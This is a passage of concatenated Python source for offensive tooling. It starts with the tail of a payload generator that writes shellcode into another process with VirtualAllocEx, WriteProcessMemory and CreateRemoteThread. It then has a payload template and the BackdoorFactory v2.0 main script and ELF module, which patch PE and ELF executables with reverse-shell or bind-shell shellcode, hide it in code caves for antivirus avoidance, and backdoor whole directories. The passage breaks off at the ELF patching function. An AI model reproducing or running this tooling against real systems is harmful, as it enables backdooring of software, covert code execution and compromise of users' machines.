                PayloadCode += '\t' + memalloc_variable + ' = ' + kernel32_variable + '.VirtualAllocEx(' + prochandle_variable + ', 0, ' + shell_length_variable + ', ' + memcommit_variable + ', ' + pagerwx_variable + ')\n'
                PayloadCode += '\t' + kernel32_variable + '.WriteProcessMemory(' + prochandle_variable + ', ' + memalloc_variable + ', ' + ShellcodeVariableName + ', ' + shell_length_variable + ', 0)\n'
                PayloadCode += '\t' + kernel32_variable + '.CreateRemoteThread(' + prochandle_variable + ', None, 0, ' + memalloc_variable + ', 0, 0, 0)\n'

                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

########NEW FILE########
__FILENAME__ = template
"""

Description of the payload.


Addtional notes, sources, links, etc.


Author of the module.

"""

# framework import to access shellcode generation
from modules.common import shellcode

# framework import to access common helper methods, including randomization
from modules.common import helpers

# framework import to access encryption and source code obfuscation methods
from modules.common import encryption

# the main config file
import settings

# Main class must be titled "Payload"
class Payload:
    
    def __init__(self):
        # required options
        self.description = "description"
        self.language = "python/cs/powershell/whatever"
        self.rating = "Poor/Normal/Good/Excellent"
        self.extension = "py/cs/c/etc."
        
        self.shellcode = shellcode.Shellcode()
        # options we require user ineraction for- format is {Option : [Value, Description]]}
        # the code logic will parse any of these out and require the user to input a value for them
        self.required_options = {
                        "compile_to_exe" : ["Y", "Compile to an executable"],
                        "use_pyherion" : ["N", "Use the pyherion encrypter"]}

        # an option note to be displayed to the user after payload generation
        # i.e. additional compile notes, or usage warnings
        self.notes = "...additional notes to user..."

    # main method that returns the generated payload code
    def generate(self):
        
        # Generate Shellcode Using msfvenom
        Shellcode = self.shellcode.generate()
        
        # build our your payload sourcecode
        PayloadCode = "..."

        # add in a randomized string
        PayloadCode += helpers.randomString()
        
        # example of how to check the internal options
        if self.required_options["use_pyherion"][0].lower() == "y":
            PayloadCode = encryption.pyherion(PayloadCode)

        # return everything
        return PayloadCode

########NEW FILE########
__FILENAME__ = backdoor
#!/usr/bin/env python
'''
    BackdoorFactory (BDF) v2.0 - Tertium Quid 

    Many thanks to Ryan O'neill --ryan 'at' codeslum <d ot> org--
    Without him, I would still be trying to do stupid things 
    with the elf format.
    Also thanks to Silvio Cesare with his 1998 paper 
    (http://vxheaven.org/lib/vsc01.html) which these ELF patching
    techniques are based on.

    Special thanks to Travis Morrow for poking holes in my ideas.

    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
   
    Copyright (C) 2013,2014, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.

'''

import sys
import os
import signal
import time
from random import choice
from optparse import OptionParser
from pebin import pebin
from elfbin import elfbin


def signal_handler(signal, frame):
        print '\nProgram Exit'
        sys.exit(0)


class bdfMain():

    version = """\
         v2.0.6 
         """

    author = """\
         Author:    Joshua Pitts
         Email:     the.midnite.runr[a t]gmail<d o t>com
         Twitter:   @midnite_runr
         """

    #ASCII ART
    menu = ["-.(`-')  (`-')  _           <-"
        ".(`-') _(`-')                            (`-')\n"
        "__( OO)  (OO ).-/  _         __( OO)"
        "( (OO ).->     .->        .->   <-.(OO )  \n"
        "'-'---.\  / ,---.   \-,-----.'-'. ,--"
        ".\    .'_ (`-')----. (`-')----. ,------,) \n"
        "| .-. (/  | \ /`.\   |  .--./|  .'   /"
        "'`'-..__)( OO).-.  '( OO).-.  '|   /`. ' \n"
        "| '-' `.) '-'|_.' | /_) (`-')|      /)"
        "|  |  ' |( _) | |  |( _) | |  ||  |_.' | \n"
        "| /`'.  |(|  .-.  | ||  |OO )|  .   ' |"
        "  |  / : \|  |)|  | \|  |)|  ||  .   .' \n"
        "| '--'  / |  | |  |(_'  '--'\|  |\   \|"
        "  '-'  /  '  '-'  '  '  '-'  '|  |\  \  \n"
        "`------'  `--' `--'   `-----'`--' '--'"
        "`------'    `-----'    `-----' `--' '--' \n"
        "           (`-')  _           (`-')     "
        "              (`-')                    \n"
        "   <-.     (OO ).-/  _        ( OO).-> "
        "      .->   <-.(OO )      .->           \n"
        "(`-')-----./ ,---.   \-,-----./    '._"
        "  (`-')----. ,------,) ,--.'  ,-.        \n"
        "(OO|(_\---'| \ /`.\   |  .--./|'--...__)"
        "( OO).-.  '|   /`. '(`-')'.'  /        \n"
        " / |  '--. '-'|_.' | /_) (`-')`--.  .--'"
        "( _) | |  ||  |_.' |(OO \    /         \n"
        " \_)  .--'(|  .-.  | ||  |OO )   |  |   "
        " \|  |)|  ||  .   .' |  /   /)         \n"
        "  `|  |_)  |  | |  |(_'  '--'\   |  |    "
        " '  '-'  '|  |\  \  `-/   /`          \n"
        "   `--'    `--' `--'   `-----'   `--'    "
        "  `-----' `--' '--'   `--'            \n",

        "__________               "
        " __       .___                   \n"
        "\______   \_____    ____ "
        "|  | __ __| _/____   ___________ \n"
        " |    |  _/\__  \ _/ ___\|"
        "  |/ // __ |/  _ \ /  _ \_  __ \ \n"
        " |    |   \ / __ \\\\  \__"
        "_|    </ /_/ (  <_> |  <_> )  | \/\n"
        " |______  /(____  /\___  >"
        "__|_ \____ |\____/ \____/|__|   \n"
        "        \/      \/     \/"
        "     \/    \/                    \n"
        "___________              "
        "__                               \n"
        "\_   _____/____    _____/"
        "  |_  ___________ ___.__.        \n"
        " |    __) \__  \ _/ ___\ "
        "  __\/  _ \_  __ <   |  |        \n"
        " |     \   / __ \\\\  \__"
        "_|  | (  <_> )  | \/\___  |        \n"
        " \___  /  (____  /\___  >_"
        "_|  \____/|__|   / ____|        \n"
        "     \/        \/     \/  "
        "                 \/             \n"]

    signal.signal(signal.SIGINT, signal_handler)

    parser = OptionParser()
    parser.add_option("-f", "--file", dest="FILE", action="store",
                      type="string",
                      help="File to backdoor")
    parser.add_option("-s", "--shell", dest="SHELL", action="store",
                      type="string",
                      help="Payloads that are available for use.")
    parser.add_option("-H", "--hostip", default=None, dest="HOST",
                      action="store", type="string",
                      help="IP of the C2 for reverse connections")
    parser.add_option("-P", "--port", default=None, dest="PORT",
                      action="store", type="int",
                      help="The port to either connect back to for reverse "
                      "shells or to listen on for bind shells")
    parser.add_option("-J", "--cave_jumping", dest="CAVE_JUMPING",
                      default=False, action="store_true",
                      help="Select this options if you want to use code cave"
                      " jumping to further hide your shellcode in the binary."
                      )
    parser.add_option("-a", "--add_new_section", default=False,
                      dest="ADD_SECTION", action="store_true",
                      help="Mandating that a new section be added to the "
                      "exe (better success) but less av avoidance")
    parser.add_option("-U", "--user_shellcode", default=None,
                      dest="SUPPLIED_SHELLCODE", action="store",
                      help="User supplied shellcode, make sure that it matches"
                      " the architecture that you are targeting."
                      )
    parser.add_option("-c", "--cave", default=False, dest="FIND_CAVES",
                      action="store_true",
                      help="The cave flag will find code caves that "
                      "can be used for stashing shellcode. "
                      "This will print to all the code caves "
                      "of a specific size."
                      "The -l flag can be use with this setting.")
    parser.add_option("-l", "--shell_length", default=380, dest="SHELL_LEN",
                      action="store", type="int",
                      help="For use with -c to help find code "
                      "caves of different sizes")
    parser.add_option("-o", "--output-file", default=None, dest="OUTPUT",
                      action="store", type="string",
                      help="The backdoor output file")
    parser.add_option("-n", "--section", default="sdata", dest="NSECTION",
                      action="store", type="string",
                      help="New section name must be "
                      "less than seven characters")
    parser.add_option("-d", "--directory", dest="DIR", action="store",
                      type="string",
                      help="This is the location of the files that "
                      "you want to backdoor. "
                      "You can make a directory of file backdooring faster by "
                      "forcing the attaching of a codecave "
                      "to the exe by using the -a setting.")
    parser.add_option("-w", "--change_access", default=True,
                      dest="CHANGE_ACCESS", action="store_false",
                      help="This flag changes the section that houses "
                      "the codecave to RWE. Sometimes this is necessary. "
                      "Enabled by default. If disabled, the "
                      "backdoor may fail.")
    parser.add_option("-i", "--injector", default=False, dest="INJECTOR",
                      action="store_true",
                      help="This command turns the backdoor factory in a "
                      "hunt and shellcode inject type of mechinism. Edit "
                      "the target settings in the injector module.")
    parser.add_option("-u", "--suffix", default=".old", dest="SUFFIX",
                      action="store", type="string",
                      help="For use with injector, places a suffix"
                      " on the original file for easy recovery")
    parser.add_option("-D", "--delete_original", default=False,
                      dest="DELETE_ORIGINAL", action="store_true",
                      help="For use with injector module.  This command"
                      " deletes the original file.  Not for use in production "
                      "systems.  *Author not responsible for stupid uses.*")
    parser.add_option("-O", "--disk_offset", default=0,
                      dest="DISK_OFFSET", type="int", action="store",
                      help="Starting point on disk offset, in bytes. "
                      "Some authors want to obfuscate their on disk offset "
                      "to avoid reverse engineering, if you find one of those "
                      "files use this flag, after you find the offset.")
    parser.add_option("-S", "--support_check", dest="SUPPORT_CHECK",
                      default=False, action="store_true",
                      help="To determine if the file is supported by BDF prior"
                      " to backdooring the file. For use by itself or with "
                      "verbose. This check happens automatically if the "
                      "backdooring is attempted."
                      )
    parser.add_option("-q", "--no_banner", dest="NO_BANNER", default=False, action="store_true",
                      help="Kills the banner."
                      )
    parser.add_option("-v", "--verbose", default=False, dest="VERBOSE",
                      action="store_true",
                      help="For debug information output.")

    (options, args) = parser.parse_args()

    def basicDiscovery(FILE):
        testBinary = open(FILE, 'rb')
        header = testBinary.read(4)
        testBinary.close()
        if 'MZ' in header:
            return 'PE'
        elif 'ELF' in header:
            return 'ELF'
        else:
            'Only support ELF and PE file formats'
            return None
        
    

    if options.NO_BANNER is False:
        print choice(menu)
        print author
        print version
        time.sleep(1)

    if options.DIR:
        for root, subFolders, files in os.walk(options.DIR):
            for _file in files:
                options.FILE = os.path.join(root, _file)
                is_supported = basicDiscovery(options.FILE)
                if is_supported is "PE":
                    supported_file = pebin(options.FILE,
                                options.OUTPUT,
                                options.SHELL,
                                options.NSECTION,
                                options.DISK_OFFSET,
                                options.ADD_SECTION,
                                options.CAVE_JUMPING,
                                options.PORT,
                                options.HOST,
                                options.SUPPLIED_SHELLCODE,
                                options.INJECTOR,
                                options.CHANGE_ACCESS,
                                options.VERBOSE,
                                options.SUPPORT_CHECK,
                                options.SHELL_LEN,
                                options.FIND_CAVES,
                                options.SUFFIX,
                                options.DELETE_ORIGINAL)
                elif is_supported is "ELF":
                    supported_file = elfbin(options.FILE, 
                                options.SHELL,
                                options.HOST,
                                options.PORT,
                                options.SUPPORT_CHECK,
                                options.FIND_CAVES,
                                options.SHELL_LEN,
                                options.SUPPLIED_SHELLCODE)
                #for item in dirlisting:
                #    options.FILE = options.DIR + '/' + item
                if options.SUPPORT_CHECK is True:
                    if os.path.isfile(options.FILE):
                        print "file", options.FILE
                        try:
                            is_supported = supported_file.support_check()
                        except Exception, e:
                            is_supported = False
                            print 'Exception:', str(e), '%s' % options.FILE
                        if is_supported is False:
                            print "%s is not supported." % options.FILE
                            #continue
                        else:
                            print "%s is supported." % options.FILE
                        #    if supported_file.flItms['runas_admin'] is True:
                        #        print "%s must be run as admin." % options.FILE
                        print "*" * 50
        
        if options.SUPPORT_CHECK is True:
            sys.exit()

        print ("You are going to backdoor the following "
               "items in the %s directory:"
               % options.DIR)
        dirlisting = os.listdir(options.DIR)
        for item in dirlisting:
            print "     {0}".format(item)
        answer = raw_input("Do you want to continue? (yes/no) ")
        if 'yes' in answer.lower():
            for item in dirlisting:
                #print item
                print "*" * 50
                options.FILE = options.DIR + '/' + item
                print ("backdooring file %s" % item)
                #result = None
                is_supported = basicDiscovery(options.FILE)
                try:
                    if is_supported is "PE":
                        supported_file = pebin(options.FILE,
                                    options.OUTPUT,
                                    options.SHELL,
                                    options.NSECTION,
                                    options.DISK_OFFSET,
                                    options.ADD_SECTION,
                                    options.CAVE_JUMPING,
                                    options.PORT,
                                    options.HOST,
                                    options.SUPPLIED_SHELLCODE,
                                    options.INJECTOR,
                                    options.CHANGE_ACCESS,
                                    options.VERBOSE,
                                    options.SUPPORT_CHECK,
                                    options.SHELL_LEN,
                                    options.FIND_CAVES,
                                    options.SUFFIX,
                                    options.DELETE_ORIGINAL)
                        supported_file.OUTPUT = None
                        supported_file.output_options()
                        result = supported_file.patch_pe()
                    elif is_supported is "ELF":
                        supported_file = elfbin(options.FILE, 
                                    options.SHELL,
                                    options.HOST,
                                    options.PORT,
                                    options.SUPPORT_CHECK,
                                    options.FIND_CAVES,
                                    options.SHELL_LEN,
                                    options.SUPPLIED_SHELLCODE)
                        supported_file.OUTPUT = None
                        supported_file.output_options()
                        result = supported_file.patch_elf()
    
                    if result is None:
                        print 'Continuing'
                        continue
                    else:
                        print ("[*] File {0} is in backdoored "
                               "directory".format(supported_file.FILE))
                except Exception as e:
                    
                    print "DIR ERROR",str(e)
        else:
            print("Goodbye")

        sys.exit()
    
    if options.INJECTOR is True:
        supported_file = pebin(options.FILE,
                                options.OUTPUT,
                                options.SHELL,
                                options.NSECTION,
                                options.DISK_OFFSET,
                                options.ADD_SECTION,
                                options.CAVE_JUMPING,
                                options.PORT,
                                options.HOST,
                                options.SUPPLIED_SHELLCODE,
                                options.INJECTOR,
                                options.CHANGE_ACCESS,
                                options.VERBOSE,
                                options.SUPPORT_CHECK,
                                options.SHELL_LEN,
                                options.FIND_CAVES,
                                options.SUFFIX,
                                options.DELETE_ORIGINAL)
        supported_file.injector()
        sys.exit()

    if not options.FILE:
        parser.print_help()
        sys.exit()

    #OUTPUT = output_options(options.FILE, options.OUTPUT)
    is_supported = basicDiscovery(options.FILE)
    if is_supported is "PE":
        supported_file = pebin(options.FILE,
                                options.OUTPUT,
                                options.SHELL,
                                options.NSECTION,
                                options.DISK_OFFSET,
                                options.ADD_SECTION,
                                options.CAVE_JUMPING,
                                options.PORT,
                                options.HOST,
                                options.SUPPLIED_SHELLCODE,
                                options.INJECTOR,
                                options.CHANGE_ACCESS,
                                options.VERBOSE,
                                options.SUPPORT_CHECK,
                                options.SHELL_LEN,
                                options.FIND_CAVES,
                                options.SUFFIX,
                                options.DELETE_ORIGINAL)
    elif is_supported is "ELF":
        supported_file = elfbin(options.FILE,
                                options.OUTPUT,
                                options.SHELL,
                                options.HOST,
                                options.PORT,
                                options.SUPPORT_CHECK,
                                options.FIND_CAVES,
                                options.SHELL_LEN,
                                options.SUPPLIED_SHELLCODE)

    result = supported_file.run_this()
    if result is True:
        print "File {0} is in the 'backdoored' directory".format(supported_file.FILE)


    #END BDF MAIN

if __name__ == "__main__":

    bdfMain()
########NEW FILE########
__FILENAME__ = elfbin
#!/usr/bin/env python
'''
    
    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    
    Copyright (C) 2013,2014, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.

'''
import struct
import os
import sys
import shutil
#from intelCore import intelCore
from intel.LinuxIntelELF32 import linux_elfI32_shellcode
from intel.LinuxIntelELF64 import linux_elfI64_shellcode



class elf():
    """
    ELF data format class for BackdoorFactory.
    We don't need the ENTIRE format.
    """

    #setting linux header infomation
    e_ident = {"EI_MAG": "\x7f" + "ELF",
                "EI_CLASS": {0x01: "x86",
                             0x02: "x64"
                            },
                "EI_DATA_little": 0x01,
                "EI_DATA_big": 0x02,
                "EI_VERSION": 0x01,
                "EI_OSABI": {0x00: "System V",
                             0x01: "HP-UX",
                             0x02: "NetBSD",
                             0x03: "Linux",
                             0x06: "Solaris",
                             0x07: "AIX",
                             0x08: "IRIX",
                             0x09: "FreeBSD",
                             0x0C: "OpenBSD"
                             }, 
                "EI_ABIVERSION": 0x00,
                "EI_PAD": 0x07
                }

    e_type = {0x01: "relocatable",
              0x02: "executable",
              0x03: "shared",
              0x04: "core"
             }

    e_machine = {0x02: "SPARC",
                 0x03: "x86",
                 0x14: "PowerPC",
                 0x28: "ARM",
                 0x32: "IA-64",
                 0x3E: "x86-64",
                 0xB7: "AArch64"
                }
    e_version = 0x01
#end elf class 


class elfbin():
    """
    This is the class handler for the elf binary format
    """
    def __init__(self, FILE, OUTPUT, SHELL, HOST="127.0.0.1", PORT=8888, 
                 SUPPORT_CHECK=False, FIND_CAVES=False, SHELL_LEN=70,
                 SUPPLIED_SHELLCODE=None):
        #print FILE
        self.FILE = FILE
        self.OUTPUT = OUTPUT
        self.bin_file = open(self.FILE, "r+b")
        self.SHELL = SHELL
        self.HOST = HOST
        self.PORT = PORT
        self.FIND_CAVES = FIND_CAVES
        self.SUPPORT_CHECK = SUPPORT_CHECK
        self.SHELL_LEN = SHELL_LEN
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.supported_types = {
                                0x00:   #System V 
                                [[0x01, #32bit
                                  0x02  #64bit
                                  ], 
                                 [0x03, #x86
                                  0x3E  #x64
                                  ]],
                                0x03:   #linx 
                                [[0x01, #32bit
                                  0x02  #64bit
                                  ], 
                                 [0x03, #x86
                                  0x3E  #x64
                                  ]],
                            
                        }
        
    def run_this(self):
        '''
        Call this if you want to run the entire process with a ELF binary.
        '''
        #self.print_supported_types()
        if self.FIND_CAVES is True:
            self.support_check()
            self.gather_file_info()
            if self.supported is False:
                print self.FILE, "is not supported."
                sys.exit()
            print ("Looking for caves with a size of %s "
               "bytes (measured as an integer)"
               % self.SHELL_LEN)
            self.find_all_caves()
            sys.exit()
        if self.SUPPORT_CHECK is True:
            if not self.FILE:
                print "You must provide a file to see if it is supported (-f)"
                sys.exit()
            try:
                self.support_check()
            except Exception, e:
                self.supported = False
                print 'Exception:', str(e), '%s' % self.FILE
            if self.supported is False:
                print "%s is not supported." % self.FILE
                self.print_supported_types()
            else:
                print "%s is supported." % self.FILE
            sys.exit(-1)
        
       
        #self.print_section_name()
        
        return self.patch_elf()
        

    def find_all_caves(self):
        """
        This function finds all the codecaves in a inputed file.
        Prints results to screen. Generally not many caves in the ELF
        format.  And why there is no need to cave jump.
        """

        print "[*] Looking for caves"
        SIZE_CAVE_TO_FIND = 94
        BeginCave = 0
        Tracking = 0
        count = 1
        caveTracker = []
        caveSpecs = []
        self.bin_file.seek(0)
        while True:
            try:
                s = struct.unpack("<b", self.bin_file.read(1))[0]
            except:
                break
            if s == 0:
                if count == 1:
                    BeginCave = Tracking
                count += 1
            else:
                if count >= SIZE_CAVE_TO_FIND:
                    caveSpecs.append(BeginCave)
                    caveSpecs.append(Tracking)
                    caveTracker.append(caveSpecs)
                count = 1
                caveSpecs = []

            Tracking += 1
        
        for caves in caveTracker:

            countOfSections = 0
            for section in self.sec_hdr.iteritems():
                #print 'section', section[1]
                section = section[1]
                sectionFound = False
                if caves[0] >= section['sh_offset'] and caves[1] <= (section['sh_size'] + section['sh_offset']) and \
                    caves[1] - caves[0] >= SIZE_CAVE_TO_FIND:
                    print "We have a winner:", section['name']
                    print '->Begin Cave', hex(caves[0])
                    print '->End of Cave', hex(caves[1])
                    print 'Size of Cave (int)', caves[1] - caves[0]
                    print 'sh_size', hex(section['sh_size'])
                    print 'sh_offset', hex(section['sh_offset'])
                    print 'End of Raw Data:', hex(section['sh_size'] + section['sh_offset'])
                    print '*' * 50
                    sectionFound = True
                    break
            if sectionFound is False:
                try:
                    print "No section"
                    print '->Begin Cave', hex(caves[0])
                    print '->End of Cave', hex(caves[1])
                    print 'Size of Cave (int)', caves[1] - caves[0]
                    print '*' * 50
                except Exception as e:
                    print str(e)
        print "[*] Total of %s caves found" % len(caveTracker)


    def set_shells(self):
        """
        This function sets the shellcode.
        """
        print "[*] Setting selected shellcode"
        if self.EI_CLASS == 0x1 and self.e_machine == 0x03:
            self.bintype = linux_elfI32_shellcode
        if self.EI_CLASS == 0x2 and self.e_machine == 0x3E:
            self.bintype = linux_elfI64_shellcode
        if not self.SHELL:
            print "You must choose a backdoor to add: "
            for item in dir(self.bintype):
                if "__" in item:
                    continue
                elif ("returnshellcode" == item 
                    or "pack_ip_addresses" == item 
                    or "eat_code_caves" == item
                    or 'ones_compliment' == item
                    or 'resume_execution' in item
                    or 'returnshellcode' in item):
                    continue
                else:
                    print "   {0}".format(item)
            sys.exit()
        if self.SHELL not in dir(self.bintype):
            print "The following %ss are available:" % str(self.bintype).split(".")[1]
            for item in dir(self.bintype):
                #print item
                if "__" in item:
                    continue
                elif ("returnshellcode" == item 
                    or "pack_ip_addresses" == item 
                    or "eat_code_caves" == item
                    or 'ones_compliment' == item
                    or 'resume_execution' in item
                    or 'returnshellcode' in item):
                    continue
                else:
                    print "   {0}".format(item)

            sys.exit(-1)
        else:
            shell_cmd = self.SHELL + "()"
        self.shells = self.bintype(self.HOST, self.PORT, self.e_entry, self.SUPPLIED_SHELLCODE)
        self.allshells = getattr(self.shells, self.SHELL)(self.e_entry)
        self.shellcode = self.shells.returnshellcode()


    def print_supported_types(self):
        """
        Prints supported types
        """
        print "Supported system types:"
        for system_type in self.supported_types.iteritems():
            print "    ",elf.e_ident["EI_OSABI"][system_type[0]]
            print "     Arch type:"
            for class_type in system_type[1][0]:
                print "\t", elf.e_ident['EI_CLASS'][class_type]
            print "     Chip set:"
            for e_mach_type in system_type[1][1]:
                print "\t", elf.e_machine[e_mach_type]
            #print "Supported class types:"
            print "*"*25

        
    def support_check(self):
        """
        Checks for support
        """
        print "[*] Checking file support" 
        self.bin_file.seek(0)
        if self.bin_file.read(4) == elf.e_ident["EI_MAG"]:
            self.bin_file.seek(5,1)
            sys_type = struct.unpack(">H", self.bin_file.read(2))[0]
            self.supported = False
            for system_type in self.supported_types.iteritems():    
                if sys_type == system_type[0]:
                    print "[*] System Type Supported:", elf.e_ident["EI_OSABI"][system_type[0]]
                    self.supported = True
                    break
        else:
            self.supported = False

            
    def get_section_name(self, section_offset):
        '''
        Get section names
        '''
        self.bin_file.seek(self.sec_hdr[self.e_shstrndx]['sh_offset']+section_offset,0)
        name = ''
        j = ''
        while True:
            j = self.bin_file.read(1)
            if hex(ord(j)) == '0x0':
                break
            else:
                name += j
        #print "name:", name

    
    def set_section_name(self):
        '''
        Set the section names
        '''
        #print "self.s_shstrndx", self.e_shstrndx
         #how to find name section specifically
        for i in range(0, self.e_shstrndx+1):
            self.sec_hdr[i]['name'] = self.get_section_name(self.sec_hdr[i]['sh_name'])
            if self.sec_hdr[i]['name'] == ".text":
                #print "Found text section"
                self.text_section =  i
        
    
    def gather_file_info(self):
        '''
        Gather info about the binary
        '''
        print "[*] Gathering file info"
        bin = self.bin_file
        bin.seek(0)
        EI_MAG = bin.read(4)
        self.EI_CLASS = struct.unpack("<B", bin.read(1))[0]
        self.EI_DATA = struct.unpack("<B", bin.read(1))[0]
        if self.EI_DATA == 0x01:
            #little endian
            self.endian = "<"
        else:
            #big self.endian
            self.endian = ">"
        self.EI_VERSION = bin.read(1)
        self.EI_OSABI = bin.read(1)
        self.EI_ABIVERSION = bin.read(1)
        self.EI_PAD = struct.unpack("<BBBBBBB", bin.read(7))[0]
        self.e_type = struct.unpack("<H", bin.read(2))[0]
        self.e_machine = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_version = struct.unpack(self.endian + "I", bin.read(4))[0]
        #print "EI_Class", self.EI_CLASS
        if self.EI_CLASS == 0x01:
            #print "32 bit D:"
            self.e_entryLocOnDisk = bin.tell()
            self.e_entry = struct.unpack(self.endian + "I", bin.read(4))[0]
            #print hex(self.e_entry)
            self.e_phoff = struct.unpack(self.endian + "I", bin.read(4))[0]
            self.e_shoff = struct.unpack(self.endian + "I", bin.read(4))[0]
        else:
            #print "64 bit B:"
            self.e_entryLocOnDisk = bin.tell()
            self.e_entry = struct.unpack(self.endian + "Q", bin.read(8))[0]
            self.e_phoff = struct.unpack(self.endian + "Q", bin.read(8))[0]
            self.e_shoff = struct.unpack(self.endian + "Q", bin.read(8))[0]
        #print hex(self.e_entry)
        #print "e_phoff", self.e_phoff
        #print "e_shoff", self.e_shoff
        self.VrtStrtngPnt = self.e_entry
        self.e_flags = struct.unpack(self.endian + "I", bin.read(4))[0]
        self.e_ehsize = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_phentsize = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_phnum = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_shentsize = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_shnum = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_shstrndx = struct.unpack(self.endian + "H", bin.read(2))[0]
        #self.e_version'] = struct.e_entry
        #section tables
        bin.seek(self.e_phoff,0)
        #header tables
        if self.e_shnum == 0:
            print "more than 0xFF00 sections, wtf?"
            #print "real number of section header table entries"
            #print "in sh_size."
            self.real_num_sections = self.sh_size
        else:
            #print "less than 0xFF00 sections, yay"
            self.real_num_sections = self.e_shnum
        #print "real_num_sections", self.real_num_sections

        bin.seek(self.e_phoff,0)
        self.prog_hdr = {}
        #print 'e_phnum', self.e_phnum
        for i in range(self.e_phnum):
            #print "i check e_phnum", i
            self.prog_hdr[i] = {}
            if self.EI_CLASS == 0x01:
                self.prog_hdr[i]['p_type'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_offset'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_vaddr'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_paddr'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_filesz'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_memsz'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_flags'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_align'] = struct.unpack(self.endian + "I", bin.read(4))[0]
            else:
                self.prog_hdr[i]['p_type'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_flags'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_offset'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.prog_hdr[i]['p_vaddr'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.prog_hdr[i]['p_paddr'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.prog_hdr[i]['p_filesz'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.prog_hdr[i]['p_memsz'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.prog_hdr[i]['p_align'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
            if self.prog_hdr[i]['p_type'] == 0x1 and self.prog_hdr[i]['p_vaddr'] < self.e_entry:
                self.offset_addr = self.prog_hdr[i]['p_vaddr'] 
                self.LocOfEntryinCode = self.e_entry - self.offset_addr
                #print "found the entry offset"

        bin.seek(self.e_shoff, 0)
        self.sec_hdr = {}
        for i in range(self.e_shnum):
            self.sec_hdr[i] = {}
            if self.EI_CLASS == 0x01:
                self.sec_hdr[i]['sh_name'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                #print self.sec_hdr[i]['sh_name']
                self.sec_hdr[i]['sh_type'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_flags'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_addr'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_offset'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_size'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_link'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_info'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_addralign'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_entsize'] = struct.unpack(self.endian + "I", bin.read(4))[0]
            else:
                self.sec_hdr[i]['sh_name'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_type'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_flags'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.sec_hdr[i]['sh_addr'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.sec_hdr[i]['sh_offset'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.sec_hdr[i]['sh_size'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.sec_hdr[i]['sh_link'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_info'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_addralign'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.sec_hdr[i]['sh_entsize'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
        #bin.seek(self.sec_hdr'][self.e_shstrndx']]['sh_offset'], 0)
        self.set_section_name()
        if self.e_type != 0x2:
            print "[!] Only supporting executable elf e_types, things may get wierd."
    
    
    def output_options(self):
        """
        Output file check.
        """
        if not self.OUTPUT:
            self.OUTPUT = os.path.basename(self.FILE)

    def patch_elf(self):
        '''
